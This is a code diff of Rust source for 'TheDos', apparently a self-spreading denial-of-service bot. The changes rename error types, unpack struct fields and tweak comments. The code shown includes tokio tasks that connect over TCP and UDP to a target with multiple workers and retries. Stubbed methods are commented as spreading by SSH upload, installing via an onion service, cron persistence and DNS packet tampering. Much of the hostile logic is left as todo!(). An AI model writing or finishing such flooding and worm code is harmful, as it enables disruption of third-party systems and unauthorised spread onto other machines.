@@ -78,17 +78,31 @@ pub fn gen_random_number(from: u32, to: u32) -> u32{
 impl TheDos{
 
 
-    pub fn spread(&self) -> Result<Self, utils::Error>{
+    pub fn spread(&self) -> Result<Self, utils::TheDosError>{
+        
+        let TheDos { 
+            flag, 
+            safe, 
+            retries, 
+            status_code, 
+            host, 
+            url, 
+            tcp_addr, 
+            udp_addr, 
+            n_workers 
+        } = self; // unpacking self into a new struct
+        
         // ssh uploading
         todo!()
+    
     }
 
-    pub fn install(&self) -> Result<Self, utils::Error>{
+    pub fn install(&self) -> Result<Self, utils::TheDosError>{
         // build configs and run the onion 
         todo!()
     }
 
-    pub fn persistence(&mut self) -> Result<Self, utils::Error>{
+    pub fn persistence(&mut self) -> Result<Self, utils::TheDosError>{
         // crontab
         todo!()
     }
@@ -244,7 +258,7 @@ impl TheDos{
         let tcp_addr = self.tcp_addr.clone().unwrap(); // if we are here we are sure that we have a tcp address from the passed in cli arg
 
         time+=1;
-        tokio::spawn(async move{ // we can't use self inside the tokio::spawn() body since self is a reference that is only valid in the associated function body
+        tokio::spawn(async move{ // we can't use self inside the tokio::spawn() body since self is a reference that is only valid in the associated function body 
             match TcpStream::connect(tcp_addr.clone().as_str()).await{
                 Ok(mut stream) => {
 
@@ -276,10 +290,10 @@ impl TheDos{
         let mut time = self.retries;
         let workers = self.n_workers; // making a new lifetime for the workers
         let udp_addr = self.udp_addr.clone().unwrap(); // if we are here we are sure that we have a udp address from the passed in cli arg
-           
+
         time+=1;
         tokio::spawn(async move{
-            let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap(); // binding to any available address and any port selected by the os 
+            let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap(); // binding to any available address and any port selected by the os for outbound packets
             match socket.connect(udp_addr.clone().as_str()).await{
                 Ok(_) => {
 
@@ -291,7 +305,6 @@ impl TheDos{
                 Err(e) => {
                     eprintln!(": {} at {}", e, chrono::Local::now());
                 }
-
             }
         });
              
@@ -307,6 +320,7 @@ impl TheDos{
     
     pub async fn dnscall(&mut self){
         
+        // modify dns packets
         // iptables o ina
         todo!();
     }
